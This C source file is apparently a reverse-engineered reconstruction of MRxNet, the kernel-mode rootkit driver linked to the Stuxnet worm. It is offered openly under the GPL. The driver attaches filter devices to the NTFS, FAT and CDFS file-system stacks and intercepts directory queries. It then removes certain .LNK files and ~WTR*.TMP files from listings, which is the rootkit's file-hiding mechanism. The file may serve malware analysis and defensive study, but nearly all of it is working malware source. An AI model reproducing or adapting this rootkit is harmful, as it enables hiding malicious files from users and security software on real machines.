/*++

 Copyright (C) 2010-2011 Amr Thabet <amr.thabet[at]student.alx.edu.eg>

Module Name:

    mrxnet.c

Abstract:

  This Module Contain The reversed MRxNet rootkit dropped by Stuxnet worm.

Licence:
  
     This program is free software; you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation; either version 2 of the License, or
     (at your option) any later version.
   
     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.
   
     You should have received a copy of the GNU General Public License
     along with this program; if not, write to Amr Thabet 
     amr.thabet@student.alx.edu.eg
   
Environment:

    Kernel mode

--*/

//Decleration
//------------

#include <ntifs.h>

typedef struct _DEVICE_EXTENSION
{
  PDEVICE_OBJECT AttachedDevice;
  PDEVICE_OBJECT RealDevice;          //Used in File System Control
  
}_DEVICE_EXTENSION, *PDEVICE_EXTENSION;

extern POBJECT_TYPE* IoDriverObjectType;

typedef struct 
{
      ULONG Object;
      PDEVICE_OBJECT DeviceObject;
}ReferencedObject;


//Data:
//-----

FAST_IO_DISPATCH g_fastIoDispatch;
PDRIVER_OBJECT DriverObject;
PDEVICE_OBJECT DeviceObject;
PCWSTR aObreferenceobjectbyname = L"ObReferenceObjectByName";
PCWSTR FileSystemsArray[3] = {
                      L"\\FileSystem\\ntfs",
                      L"\\FileSystem\\fastfat",
                      L"\\FileSystem\\cdfs",
                      };

PCWSTR BannedDirecoty = L"{58763ECF-8AC3-4a5f-9430-1A310CE4BE0A}";
PCWSTR DebugMSG = L"b:\\myrtus\\src\\objfre_w2k_x86\\i386\\guava.pdb";


//ProtoTyping:
//------------

#define  FUNC  NTSTATUS (*ObReferenceObjectByNameFunc)(PUNICODE_STRING ObjectName,\
         ULONG Attributes,\
         PACCESS_STATE AccessState,\
         ACCESS_MASK DesiredAccess,\
         POBJECT_TYPE ObjectType,\
         KPROCESSOR_MODE AccessMode,\
         PVOID ParseContext OPTIONAL,\
         PVOID* Object)

VOID SetFastIoDispatch();
NTSTATUS HookingFileSystems();
VOID HookOne(FUNC,PCWSTR FileSystem);
VOID DriverNotificationRoutine(PDEVICE_OBJECT TargetDevice,int command);
VOID AttachDevice(PDEVICE_OBJECT TargetDevice);
BOOLEAN IsAllreadyAttached(PDEVICE_OBJECT TargetDevice);
NTSTATUS CreateDevice(PDEVICE_OBJECT TargetDevice,PDEVICE_OBJECT *SourceDevice);
BOOLEAN IsMyDevice(PDEVICE_OBJECT TargetDevice);
VOID SettingFlags(PDEVICE_OBJECT DeviceObject,PDEVICE_OBJECT TargetDevice);
BOOLEAN AttachToStack(PDEVICE_OBJECT SourceDevice,PDEVICE_OBJECT TargetDevice,PDEVICE_EXTENSION DeviceExtension);
VOID OnFileSystemControl(PDEVICE_OBJECT DeviceObject,PIRP Irp);
VOID SetCompletionFileControl(PDEVICE_OBJECT TargetDevice,PIRP Irp);
NTSTATUS SetFSCompletionRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp);
NTSTATUS FileControlCompletionRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp,PDEVICE_OBJECT* Context);
BOOLEAN AttachDelayThread(PDEVICE_OBJECT DeviceObject,PDEVICE_OBJECT TargetDevice);
VOID OnDirectoryControl(PDEVICE_OBJECT DeviceObject,PIRP Irp);
VOID SetCompletionDirControl(PDEVICE_OBJECT DeviceObject,PIRP Irp);
NTSTATUS DirectoryCompletionRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp,PDEVICE_OBJECT* Context);
VOID FreeMdl(PIRP Irp,PMDL* Context);
ULONG AllocateMdl(PMDL* LclContext,PIRP Irp,PIO_STACK_LOCATION CurrentStack);
ULONG CreateWorkRoutine(PDEVICE_OBJECT DeviceObject,PIO_STACK_LOCATION CurrentStack,PIRP Irp,PVOID LclContext);
NTSTATUS WorkerRoutine(PDEVICE_OBJECT DeviceObject,PLARGE_INTEGER Context);
ULONG GetOffsets(ULONG FileInformationClass,ULONG* EndOfFile,ULONG* FilenameOffset,ULONG* FilenameLength);
ULONG FileCheck (PVOID UserBuffer,ULONG NextEntryOffset,ULONG EndOfFile,ULONG FilenameOffset,ULONG FilenameLength);
ULONG StrCheck(PCWSTR TargetString,PCWSTR SourceString,int Size);
ULONG TMPCheck(PCWSTR Filename,int Length,int LowPart,int HighPart);


//Functions:
//----------

VOID CallDriver(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{ 

     Irp->CurrentLocation++;
     Irp->Tail.Overlay.CurrentStackLocation = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation + (ULONG)sizeof(IO_STACK_LOCATION));// 0x24); 
     IoCallDriver(((PDEVICE_EXTENSION)(DeviceObject->DeviceExtension))->AttachedDevice,Irp);
};


VOID IRPDispatchRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
    return CallDriver(DeviceObject,Irp);
  
}


VOID SetZero(PDEVICE_EXTENSION DeviceExtention,ULONG Value){
    DeviceExtention->AttachedDevice=(PDEVICE_OBJECT)0;
    DeviceExtention->RealDevice=(PDEVICE_OBJECT)0;
    DeviceExtention->RealDevice=(PDEVICE_OBJECT)Value;
};


/**-------------------------------------------------------------------

    Driver Entry

----------------------------------------------------------------------**/


NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING theRegistryPath )
{
    int i;
    NTSTATUS status;
    DriverObject=pDriverObject;
    status=IoCreateDevice(DriverObject, sizeof(_DEVICE_EXTENSION),0,FILE_DEVICE_DISK_FILE_SYSTEM,0x100,0,&DeviceObject);
    if (status!=STATUS_SUCCESS){
        IoDeleteDevice(DeviceObject);
        return 0;   
    }
    SetZero(DeviceObject->DeviceExtension,0);
    for(i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++ )
    {
       DriverObject->MajorFunction[i] = IRPDispatchRoutine;
    }
    DriverObject->MajorFunction[IRP_MJ_FILE_SYSTEM_CONTROL] = OnFileSystemControl;
    DriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] =  OnDirectoryControl;
    SetFastIoDispatch();
    HookingFileSystems();
    status = IoRegisterFsRegistrationChange( DriverObject, (PDRIVER_FS_NOTIFICATION)DriverNotificationRoutine);
    if (status!=STATUS_SUCCESS){    
        IoDeleteDevice(DeviceObject);
        DriverObject->FastIoDispatch = 0;
        return status; //Error
    }
    return STATUS_SUCCESS;
};

/**-------------------------------------------------------------------

    Hooking File Systems

----------------------------------------------------------------------**/

NTSTATUS HookingFileSystems()
{
     UNICODE_STRING SystemRoutineName;
     int i;
     ULONG (*FunctionAddress)();
     RtlInitUnicodeString(&SystemRoutineName,aObreferenceobjectbyname);
     FunctionAddress = MmGetSystemRoutineAddress(&SystemRoutineName);
     if (FunctionAddress == 0)return 0;
     for (i = 0; i < 3;i++){
        HookOne(FunctionAddress,FileSystemsArray[i]);
     };
     return STATUS_SUCCESS;
}

VOID HookOne(FUNC,PCWSTR FileSystem)
{
     UNICODE_STRING DestinationString;
     NTSTATUS Status;
     PDEVICE_OBJECT AttachObject;
     Status = STATUS_SUCCESS;
     RtlInitUnicodeString(&DestinationString,FileSystem);
     Status = (*ObReferenceObjectByNameFunc)(&DestinationString,0x40,0,0,*IoDriverObjectType,0,0,(PVOID)&FileSystem);
     if (Status!=STATUS_SUCCESS){
        return;
      };
      AttachObject=0;
      AttachObject =((ReferencedObject*)FileSystem)->DeviceObject;
      while (AttachObject != 0)
      {
         DriverNotificationRoutine(AttachObject,1);
         AttachObject = (PDEVICE_OBJECT)*((int*)((ULONG)AttachObject + (ULONG)0x0C));          //Next Element
      };
      ObDereferenceObject(((ReferencedObject*)FileSystem));
};
/**-------------------------------------------------------------------

    Driver Notification Routine

----------------------------------------------------------------------**/
#define COMMAND_ATTACH 1
#define COMMAND_DETACH 0
VOID DriverNotificationRoutine(PDEVICE_OBJECT TargetDevice,int command)
{
    PDEVICE_OBJECT AttachedDevice;
    
    if (command == COMMAND_ATTACH){
        AttachDevice(TargetDevice);
    }else{
        AttachedDevice=TargetDevice->AttachedDevice;
        while(AttachedDevice !=0){
            if (IsMyDevice(AttachedDevice) == TRUE){
                IoDetachDevice(TargetDevice);
                IoDeleteDevice(AttachedDevice);
                break;
            };
            TargetDevice=AttachedDevice;                    //The parent Device (to detach)
            AttachedDevice=TargetDevice->AttachedDevice;    //Get The Next Attached Device
        };
         
    };
};
/**-------------------------------------------------------------------

    Attaching Device

----------------------------------------------------------------------**/
VOID AttachDevice(PDEVICE_OBJECT TargetDevice)
{
  
    PDEVICE_OBJECT SourceDevice;
    if (TargetDevice->DeviceType == FILE_DEVICE_DISK_FILE_SYSTEM || TargetDevice->DeviceType == FILE_DEVICE_CD_ROM_FILE_SYSTEM || TargetDevice->DeviceType ==  FILE_DEVICE_NETWORK_FILE_SYSTEM)
    {
      if (IsAllreadyAttached(TargetDevice) == TRUE) return;
      if (CreateDevice(TargetDevice,&SourceDevice) != STATUS_SUCCESS)return;
      SettingFlags(SourceDevice,TargetDevice);
      SetZero(SourceDevice->DeviceExtension,0);
      if (AttachToStack(SourceDevice,TargetDevice,SourceDevice->DeviceExtension)!= TRUE){
          IoDeleteDevice(SourceDevice);
          return;        
      };
    };
};
BOOLEAN IsAllreadyAttached(PDEVICE_OBJECT TargetDevice)
{
  PDEVICE_OBJECT AttachedDevice;
  if(TargetDevice != 0){
      AttachedDevice=TargetDevice->AttachedDevice;
      while(AttachedDevice !=0){
            if (AttachedDevice->DriverObject == DriverObject && AttachedDevice->DeviceExtension !=0){
                return TRUE;                                //Allready Attached
            };
            AttachedDevice=AttachedDevice->AttachedDevice;    //Get The Next Attached Device
        };
         
  }
  return FALSE;
}

NTSTATUS CreateDevice(PDEVICE_OBJECT TargetDevice,PDEVICE_OBJECT *SourceDevice)
{
  return IoCreateDevice(DriverObject,sizeof(_DEVICE_EXTENSION),0,TargetDevice->DeviceType,0,0,SourceDevice);
  
}

BOOLEAN IsMyDevice(PDEVICE_OBJECT TargetDevice)
{
  if (TargetDevice != 0 && TargetDevice->DriverObject == DriverObject){
                return TRUE;                                //Allready Attached
  };
  return FALSE;
};

VOID SettingFlags(PDEVICE_OBJECT DeviceObject,PDEVICE_OBJECT TargetDevice)
{
  DeviceObject->Flags |= (TargetDevice->Flags & (0x40000 | 0x10 | DO_BUFFERED_IO));
  DeviceObject->Characteristics |= (TargetDevice->Characteristics & FILE_DEVICE_SECURE_OPEN);
};

BOOLEAN AttachToStack(PDEVICE_OBJECT SourceDevice,PDEVICE_OBJECT TargetDevice,PDEVICE_EXTENSION DeviceExtension)
{
  DeviceExtension->AttachedDevice = TargetDevice;
  if (IoAttachDeviceToDeviceStack(SourceDevice,TargetDevice) == STATUS_SUCCESS){
      return TRUE;  
  };
  return FALSE;
}

/**-------------------------------------------------------------------

    File System Control

----------------------------------------------------------------------**/

VOID OnFileSystemControl(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
  if (Irp->Tail.Overlay.CurrentStackLocation->MinorFunction == IRP_MN_MOUNT_VOLUME){
      SetCompletionFileControl(DeviceObject,Irp);
  }else{
    return CallDriver(DeviceObject,Irp);
  }
};

VOID SetCompletionFileControl(PDEVICE_OBJECT TargetDevice,PIRP Irp)
{
  PDEVICE_OBJECT DeviceObject = 0;
  if (CreateDevice(TargetDevice,&DeviceObject) != STATUS_SUCCESS){
      Irp->IoStatus.Information=0;
      Irp->IoStatus.Status=STATUS_SUCCESS;
      IoCompleteRequest(Irp,0);
      return;
  };
  SetZero(DeviceObject->DeviceExtension,Irp->Tail.Overlay.CurrentStackLocation->Parameters.MountVolume.Vpb->RealDevice);
  if (SetFSCompletionRoutine(DeviceObject,Irp) == 0){
     Irp->CurrentLocation++;
     Irp->Tail.Overlay.CurrentStackLocation = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation + (ULONG)sizeof(IO_STACK_LOCATION));// 0x24); 
  };
  return IoCallDriver(((PDEVICE_EXTENSION)(DeviceObject->DeviceExtension))->AttachedDevice,Irp);
};


NTSTATUS SetFSCompletionRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
  int i;
  ULONG* CurrentStack;
  ULONG* PrevStack;
  PIO_STACK_LOCATION PrevIrpStack;
  PDEVICE_OBJECT* Buff=ExAllocatePool(0,4);
  if (Buff==0){
      return 0;
  };
  *Buff = DeviceObject;
  CurrentStack = Irp->Tail.Overlay.CurrentStackLocation;
  PrevStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
  
  for (i = 0;i<8;i++){
    PrevStack[i]=CurrentStack[i];
  };
  PrevIrpStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
  PrevIrpStack->Control=0;
  PrevIrpStack->Context = Buff;
  PrevIrpStack->CompletionRoutine = FileControlCompletionRoutine;
  PrevIrpStack->Control=0xE0;
  return 1;
};


NTSTATUS FileControlCompletionRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp,PDEVICE_OBJECT* Context)
{
  PDEVICE_OBJECT TargetDevice;
  TargetDevice = ((PDEVICE_EXTENSION)((*Context)->DeviceExtension))->RealDevice->Vpb->DeviceObject;
  if (Irp->IoStatus.Status != STATUS_SUCCESS)
  {
    IoDeleteDevice(DeviceObject);
    ExFreePoolWithTag(Context,0);
  }
  if (IsAllreadyAttached(TargetDevice) == TRUE){
    IoDeleteDevice(DeviceObject);
    ExFreePoolWithTag(Context,0);
    return STATUS_SUCCESS;
  };
  if (AttachDelayThread(*Context,TargetDevice) != TRUE){
    IoDeleteDevice(DeviceObject);
  };
  ExFreePoolWithTag(Context,0);
  return STATUS_SUCCESS;
};

BOOLEAN AttachDelayThread(PDEVICE_OBJECT DeviceObject,PDEVICE_OBJECT TargetDevice)
{
  LARGE_INTEGER Interval;
  int i;
  SettingFlags(DeviceObject,TargetDevice);
  for ( i = 0;i<8 ;i++){
    if (AttachToStack(DeviceObject,TargetDevice,DeviceObject->DeviceExtension)== TRUE){
        return TRUE;        
    };
    *((ULONG*)((ULONG)&Interval+(ULONG)4)) = -1;
    *((ULONG*)&Interval) = -5000000;
    KeDelayExecutionThread(0,FALSE,&Interval);
  };
  return FALSE;
};
/**-------------------------------------------------------------------

    Directory Control

----------------------------------------------------------------------**/

VOID OnDirectoryControl(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
  if (Irp->Tail.Overlay.CurrentStackLocation->MinorFunction == IRP_MN_QUERY_DIRECTORY){
      SetCompletionDirControl(DeviceObject,Irp);
  }else{
    return CallDriver(DeviceObject,Irp);
  }
};

VOID SetCompletionDirControl(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
  PUNICODE_STRING Filename;
  PIO_STACK_LOCATION CurrentStack;
  PIO_STACK_LOCATION PrevStack;
  PIO_STACK_LOCATION PrevIrpStack;
  int i;
  CurrentStack = Irp->Tail.Overlay.CurrentStackLocation;
  if (!(CurrentStack->FileObject->Flags & 0x400000) && CurrentStack->FileObject != 0){
    Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.FileName = 0; //Clear Filename
    if (CurrentStack->FileObject != 0)CurrentStack->FileObject->Flags &= 0x400000;
    CallDriver(DeviceObject,Irp);
  }
  Filename = CurrentStack->Parameters.QueryDirectory.FileName;
  if (Filename != 0 && Filename->Length == 0x4C /*The Size of BannedDirectory*/ ){
      for (i =0;i< 19; i++)
      {
          if ((ULONG)BannedDirecoty[i] == (ULONG)Filename->Buffer[i]){
              goto Error;
          };
      };
      goto Inject;
Error:
  
    CurrentStack->Parameters.QueryDirectory.FileName = 0; //Clear Filename
    if (Irp->Tail.Overlay.CurrentStackLocation->FileObject != 0)Irp->Tail.Overlay.CurrentStackLocation->FileObject->Flags &= 0x400000;
    CallDriver(DeviceObject,Irp);
    return;
  }; 
  
Inject:
  
  CurrentStack->Control=1;
  PrevStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
  
  for (i = 0;i<8;i++){
    PrevStack[i]=CurrentStack[i];
  };
  PrevIrpStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
  PrevIrpStack->Control = 0;
  PrevIrpStack->Context = 0;
  PrevIrpStack->CompletionRoutine = DirectoryCompletionRoutine;
  PrevIrpStack->Control=0xE0;
  return IoCallDriver(((PDEVICE_EXTENSION)(DeviceObject->DeviceExtension))->AttachedDevice,Irp);
};


NTSTATUS DirectoryCompletionRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp,PDEVICE_OBJECT* Context)
{
  ULONG EndOfFile;
  ULONG FilenameOffset;
  ULONG LclContext;
  ULONG FilenameLength;
  PVOID mmFiles;
  LclContext = (ULONG)Context;
  if (Irp->IoStatus.Status != STATUS_SUCCESS){
    FreeMdl(Irp,LclContext);
    return 0;
  };
  if (GetOffsets(Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.FileInformationClass, \
                              &EndOfFile,&FilenameOffset,&FilenameLength) == 0){
    FreeMdl(Irp,LclContext);
    return 0;
  };
  if (Irp->MdlAddress != 0){
    if (Irp->MdlAddress->MdlFlags  == 5){
      //maps the physical pages that are described by The MDL to a virtual address
      mmFiles=MmMapLockedPagesSpecifyCache(Irp->MdlAddress,0,MmCached,0,0,0x10);
      if (mmFiles == 0){
        FreeMdl(Irp,LclContext);
        return 0;
      };
    }else if (Irp->MdlAddress->MappedSystemVa == 0){
      FreeMdl(Irp,LclContext);
      return 0;  
    };
  }else{
    mmFiles=Irp->UserBuffer;
  };
  if (FileCheck(mmFiles,Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.Length, \
                            EndOfFile,FilenameOffset,FilenameLength) != 0){
    Irp->IoStatus.Status = STATUS_SUCCESS;
    FreeMdl(Irp,Context);
    return 0;
  };
  if (Irp->MdlAddress == 0){
      LclContext = ExAllocatePool(0,4);
      if (LclContext == 0 || AllocateMdl(LclContext,Irp,Irp->Tail.Overlay.CurrentStackLocation) == 0){
        FreeMdl(Irp,LclContext);
        Irp->IoStatus.Status=0x0C000009A;
        return 0;  
      };
  };
   Irp->IoStatus.Status = CreateWorkRoutine(DeviceObject,Irp->Tail.Overlay.CurrentStackLocation,Irp,LclContext);
   return;
};

VOID FreeMdl(PIRP Irp,PMDL* Context)
{
  if (Irp->MdlAddress == *Context){
       Irp->MdlAddress=0;
       MmUnlockPages((PMDL)*Context);
       IoFreeMdl(*Context);
  };
  ExFreePoolWithTag(*Context,0);
  
};

ULONG AllocateMdl(PMDL* LclContext,PIRP Irp,PIO_STACK_LOCATION CurrentStack)
{
  PMDL pMdl;
  pMdl = IoAllocateMdl(Irp->UserBuffer,CurrentStack->Parameters.QueryDirectory.Length,0,0,Irp);
  if (pMdl ==0){
    return 0;
  };
  MmProbeAndLockPages(pMdl,0,IoModifyAccess);
  Irp->MdlAddress = pMdl;
  *LclContext = pMdl;
  return 1;
};

ULONG CreateWorkRoutine(PDEVICE_OBJECT DeviceObject,PIO_STACK_LOCATION CurrentStack,PIRP Irp,PVOID LclContext)
{
  PLARGE_INTEGER pPool;
  PIO_STACK_LOCATION PrevIrpStack;
  int i;
  pPool = ExAllocatePool(0,8);
  if (pPool == 0){
    return 0xC000009A;
  };
  pPool->u.LowPart = IoAllocateWorkItem(DeviceObject);
  if (pPool->u.LowPart == 0){
    return 0xC000009A;
  };
  pPool->u.HighPart=Irp;
  CurrentStack->Flags &= 0xFE;
  CurrentStack->Parameters.QueryDirectory.FileIndex =0;
  Irp->Tail.Overlay.CurrentStackLocation->Control |= 1;
  PrevIrpStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
  for (i = 0;i<8;i++){
    PrevIrpStack[i]=CurrentStack[i];
  };
  PrevIrpStack->Control=0;
  PrevIrpStack->Context = LclContext;
  PrevIrpStack->CompletionRoutine = DirectoryCompletionRoutine;
  PrevIrpStack->Control=0xE0;
  IoQueueWorkItem(pPool->u.LowPart,WorkerRoutine,1,pPool);
  return 0xC0000016;
};

NTSTATUS WorkerRoutine(PDEVICE_OBJECT DeviceObject,PLARGE_INTEGER Context)
{
  IoCallDriver(((PDEVICE_EXTENSION)(DeviceObject->DeviceExtension))->AttachedDevice,Context->u.HighPart);
  IoFreeWorkItem(Context->u.LowPart);
  ExFreePoolWithTag(Context,0);
  return STATUS_SUCCESS;
};

/**-------------------------------------------------------------------

    File Checking

----------------------------------------------------------------------**/

ULONG GetOffsets(ULONG FileInformationClass,ULONG* EndOfFile,ULONG* FilenameOffset,ULONG* FilenameLength)
{
  switch (FileInformationClass) {
   case FileBothDirectoryInformation : 
         *EndOfFile = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, EndOfFile);
         *FilenameOffset = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileName);
   case FileDirectoryInformation:
      *EndOfFile = FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, EndOfFile);
      *FilenameOffset = FIELD_OFFSET(FILE_DIRECTORY_INFORMATION, FileName);
   case FileFullDirectoryInformation:
      *EndOfFile = FIELD_OFFSET( FILE_FULL_DIR_INFORMATION , EndOfFile);
      *FilenameOffset = FIELD_OFFSET( FILE_FULL_DIR_INFORMATION , FileName);
   case FileIdBothDirectoryInformation:
      *EndOfFile = FIELD_OFFSET( FILE_ID_BOTH_DIR_INFORMATION, EndOfFile);
      *FilenameOffset = FIELD_OFFSET( FILE_ID_BOTH_DIR_INFORMATION, FileName);
   case FileIdFullDirectoryInformation:
      *EndOfFile = FIELD_OFFSET( FILE_ID_FULL_DIR_INFORMATION, EndOfFile);
      *FilenameOffset = FIELD_OFFSET( FILE_ID_FULL_DIR_INFORMATION, FileName);
   case FileNamesInformation:
      *EndOfFile = -1;
      *FilenameOffset = FIELD_OFFSET( FILE_NAMES_INFORMATION, FileName);
      *FilenameLength = FIELD_OFFSET(FILE_NAMES_INFORMATION, FileNameLength);
      return 1;
    default:
      return 0;
  };
  *FilenameLength = FIELD_OFFSET(FILE_BOTH_DIR_INFORMATION, FileNameLength);
  return 1;
};

ULONG FileCheck (ULONG* UserBuffer,ULONG NextEntryOffset,ULONG EndOfFile,ULONG FilenameOffset,ULONG FilenameLength)
{
  LARGE_INTEGER FileSize;
  ULONG EntryPtr;
  ULONG PrevOffset;
  PCWSTR Filename;
  ULONG Length;
  
  EntryPtr = 0;
  PrevOffset = NextEntryOffset;
  (ULONG)UserBuffer &= 0xFFFFFF00;
  if (NextEntryOffset == 0){
    return 1;
  };
  do{
    NextEntryOffset = *UserBuffer;
    if (EndOfFile == -1){   //FileNamesInformation
      FileSize.u.LowPart=0;
      FileSize.u.HighPart=0;
    };
    FileSize.u.LowPart = *((ULONG*)((ULONG)UserBuffer + EndOfFile));
    FileSize.u.HighPart = *((ULONG*)((ULONG)UserBuffer + EndOfFile + 4));
    Length = *((ULONG*)((ULONG)UserBuffer + FilenameLength));
    Filename = (PCWSTR)((ULONG)UserBuffer + FilenameOffset);
    if (Length & 1){         //mean couldn't be divided by 2 (That's will be strange because it's a unicode string (Wide char))
      EntryPtr = UserBuffer;
      UserBuffer+=NextEntryOffset;
      (ULONG)UserBuffer |= 0x01;    //mov     byte ptr [ebp+UserBuffer+3], 1
      PrevOffset  -= NextEntryOffset;
      continue;
    };
    Length -= FilenameOffset;   //I don't know why
    Length /= 2;                  //number of characters
    if ((((FileSize.u.HighPart != -1) && (FileSize.u.LowPart != -1)) || (FileSize.u.HighPart == 0 && FileSize.u.LowPart == 4171)) && (Length > 4)){
      if (StrCheck(L".LNK",&Filename[Length -4],4) != 0){
        memmove(UserBuffer,UserBuffer + NextEntryOffset,PrevOffset - NextEntryOffset);
        PrevOffset  -= NextEntryOffset;
        continue;
      };
    };
    if (TMPCheck(Filename,Length,FileSize.u.LowPart,FileSize.u.HighPart) ==0){
      EntryPtr = UserBuffer;
      UserBuffer+=NextEntryOffset;
      (ULONG)UserBuffer |= 0x01;    //mov     byte ptr [ebp+UserBuffer+3], 1
    }else{
      if (NextEntryOffset != 0){
        memmove(UserBuffer,UserBuffer + NextEntryOffset,PrevOffset - NextEntryOffset);
      }else{
        if (EntryPtr !=0)EntryPtr = 0;
        break;
      };
    };
    PrevOffset  -= NextEntryOffset;
  }while ( PrevOffset != 0);
  return ((ULONG)UserBuffer & 1);      // cmp     byte ptr [ebp+UserBuffer+3], 0  / setnz   al
};

ULONG StrCheck(PCWSTR TargetString,PCWSTR SourceString,int Size)
{
  WCHAR chr;
  if (TargetString[0] == 0) return 1;
  do{
    if (Size == 0)return 0;
    chr = toupper(SourceString[0]);
    if (chr != toupper(TargetString[0]))return 0;
    (ULONG)SourceString += 2;
    (ULONG)TargetString += 2;
    Size--;
  }while(TargetString[0] !=0);
  return 1;
};

ULONG TMPCheck(PCWSTR Filename,int Length,int LowPart,int HighPart)
{
  int i;
  WCHAR chr;
  int Mod = 0;
  if (!(LowPart == -1 && HighPart == -1) && (HighPart == 0 || LowPart < 4096 || LowPart > 8388608)) return 0;
  if (Length !=12)return 0;
  if (StrCheck(L".TMP",&Filename[Length -4],4) == 0)return 0;
  if (StrCheck(L"~WTR",Filename,4) == 0)return 0;
  for (i = 4;i < 8; i++){
    chr = Filename[i];
    if (chr<'0' || chr >'9')return 0;
    Mod =(chr - 0x30 + Mod) % 10;
  };
  if (Mod == 0)return 1;
  return 0;
};
